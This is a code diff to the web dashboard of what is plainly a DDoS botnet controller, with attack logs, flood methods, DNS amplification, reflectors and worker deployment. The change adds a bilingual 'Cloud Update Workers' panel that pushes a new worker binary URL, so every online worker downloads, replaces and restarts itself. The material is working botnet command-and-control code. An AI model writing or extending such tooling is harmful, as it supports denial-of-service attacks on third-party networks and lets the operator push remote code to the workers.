@@ -394,6 +394,17 @@
           </div>
           <div class="worker-cmd" style="margin-top:0;min-height:32px" x-text="deployCmd || t('deploy_cmd_empty')"></div>
           <div style="margin-top:8px;font-size:10px;color:var(--text);opacity:0.6;white-space:pre-line" x-text="t('deploy_tip')"></div>
+          <div style="border-top:1px solid var(--border);margin:10px 0 8px"></div>
+          <h3 style="font-size:12px;margin-bottom:6px" x-text="t('update_worker')"></h3>
+          <div style="display:flex;gap:6px;margin-bottom:6px;align-items:center">
+            <input x-model="updateVersion" :placeholder="t('update_version_ph')" style="flex:0 0 80px;margin-bottom:0">
+            <input x-model="updateURL" :placeholder="t('update_url_ph')" style="flex:1;margin-bottom:0">
+          </div>
+          <div style="display:flex;gap:6px">
+            <button class="btn" @click="saveUpdate()" x-text="t('update_push')" style="flex:1"></button>
+            <button class="btn" @click="clearUpdate()" x-text="t('update_clear')" style="flex:0;white-space:nowrap"></button>
+          </div>
+          <div style="margin-top:6px;font-size:10px;color:var(--text);opacity:0.6;white-space:pre-line" x-text="updateStatus || t('update_tip')"></div>
         </div>
       </div>
     </div>
@@ -531,6 +542,10 @@ function app() {
       quick_deploy:'Quick Deploy', deploy_storage_ph:'Cloud storage URL (worker binary)', deploy_cmd_empty:'Set storage URL then Save to generate command',
       deploy_proxy:'Fetch L7 proxies (-proxy)', deploy_install:'Install auto-start service (-install)', deploy_daemon:'Run in background (-daemon)',
       deploy_grpc_port:'gRPC port:', deploy_grpc_port_hint:'(auto, leave empty)',
+      update_worker:'Cloud Update Workers', update_version_ph:'version (e.g. v1.0.4)', update_url_ph:'worker binary URL',
+      update_push:'Push Update', update_clear:'Clear', update_status_ok:'Update target set. Workers will auto-update within ~60s.',
+      update_status_cleared:'Update config cleared.', update_tip:'All online workers download, verify, replace and restart themselves automatically within ~60s.',
+      update_need_both:'Both version and URL are required.',
       deploy_tip:'Command auto-concatenates controller address + worker token.\nNon-root users: -daemon runs in background without nohup (log: data/worker.log).\n-install and -daemon are mutually exclusive.',
       attack_logs:'Attack Logs', all_methods:'All Methods', export_csv:'Export CSV',
       col_id:'ID', col_ip:'IP', col_os:'OS', col_cpu:'CPU', col_mem:'Memory', col_location:'Location', col_status:'Status',
@@ -569,6 +584,10 @@ function app() {
       quick_deploy:'快速上线', deploy_storage_ph:'云存储 URL (worker 二进制直链)', deploy_cmd_empty:'先设置存储 URL 并保存以生成命令',
       deploy_proxy:'拉取 L7 代理 (-proxy)', deploy_install:'安装自启动服务 (-install)', deploy_daemon:'后台运行 (-daemon)',
       deploy_grpc_port:'gRPC 端口:', deploy_grpc_port_hint:'(自动，留空)',
+      update_worker:'云更新 Worker', update_version_ph:'版本号 (如 v1.0.4)', update_url_ph:'worker 二进制 URL',
+      update_push:'下发更新', update_clear:'清除', update_status_ok:'更新目标已设置，所有在线 Worker 约 60s 内自动更新。',
+      update_status_cleared:'更新配置已清除。', update_tip:'所有在线 Worker 自动下载、校验、替换并重启，无需逐台登录。',
+      update_need_both:'版本号和 URL 都需要填写。',
       deploy_tip:'命令自动拼接控制器地址 + worker 令牌。\n非 root 用户: -daemon 免 nohup 后台运行 (日志: data/worker.log)。\n-install 与 -daemon 互斥。',
       attack_logs:'攻击日志', all_methods:'所有方法', export_csv:'导出CSV',
       col_id:'ID', col_ip:'IP', col_os:'系统', col_cpu:'CPU', col_mem:'内存', col_location:'位置', col_status:'状态',
@@ -582,6 +601,7 @@ function app() {
     nodes:[], tasks:[], totalPPS:0, totalMBps:0, totalPackets:0,
     activeWorkers:0, onlineNodes:0, uptime:0, ws:null,
     deployStorage:'', deployProxy:false, deployInstall:false, deployDaemon:false, deployCmd:'', deployGrpcPort:'9090',
+    updateVersion:'', updateURL:'', updateStatus:'',
     form:{ method:'vse', game:'', target:'', duration:60, threads:10, packet_size:1400, rate_limit_pps:0, rate_limit_bps:0, burst_mode:false, mix:false, jitter_ms:0, fallback_to_udp:true, sub_attacks:[] },
     templates:[], selectedTemplate:'',
     logs:[], logTotal:0, logFilter:'',
@@ -629,7 +649,7 @@ function app() {
     setupDashboard() {
       this.connectWS();
       setInterval(() => { this.uptime++; this.fetchStats(); }, 1000);
-      this.fetchNodes(); this.fetchTasks(); this.loadProxy(); this.loadDNSAmp(); this.loadReflectors(); this.fetchTemplates(); this.fetchLogs(); this.loadDeploy();
+      this.fetchNodes(); this.fetchTasks(); this.loadProxy(); this.loadDNSAmp(); this.loadReflectors(); this.fetchTemplates(); this.fetchLogs(); this.loadDeploy(); this.loadUpdate();
     },
 
     getAuthHeaders() {
@@ -763,6 +783,21 @@ function app() {
       const d = await r.json(); if (d.error) { alert(d.error); return; } this.buildDeployCmd();
     },
     deployGrpcPortInput() { localStorage.setItem('deployGrpcPort', this.deployGrpcPort||'9090'); this.buildDeployCmd(); },
+    async loadUpdate() {
+      try { const r = await fetch('/api/deploy/update',{headers:this.getAuthHeaders()}); const d = await r.json();
+        this.updateVersion = d.version||''; this.updateURL = d.url||''; } catch(e) {}
+    },
+    async saveUpdate() {
+      if (!this.updateVersion || !this.updateURL) { alert(this.t('update_need_both')); return; }
+      try { const r = await fetch('/api/deploy/update',{method:'PUT',headers:this.getAuthHeaders(),body:JSON.stringify({version:this.updateVersion,url:this.updateURL})});
+        const d = await r.json(); if (d.error) { alert(d.error); return; }
+        this.updateStatus = this.t('update_status_ok'); } catch(e) { this.updateStatus='Error: '+e.message; }
+    },
+    async clearUpdate() {
+      try { const r = await fetch('/api/deploy/update',{method:'PUT',headers:this.getAuthHeaders(),body:JSON.stringify({version:'',url:''})});
+        const d = await r.json(); if (d.error) { alert(d.error); return; }
+        this.updateVersion=''; this.updateURL=''; this.updateStatus = this.t('update_status_cleared'); } catch(e) { this.updateStatus='Error: '+e.message; }
+    },
     toggleInstall() { if (this.deployInstall) this.deployDaemon = false; this.buildDeployCmd(); },
     async buildDeployCmd() {
       // Controller 全自动：公网 IP 自动探测 + gRPC/HTTP 端口从监听地址推导
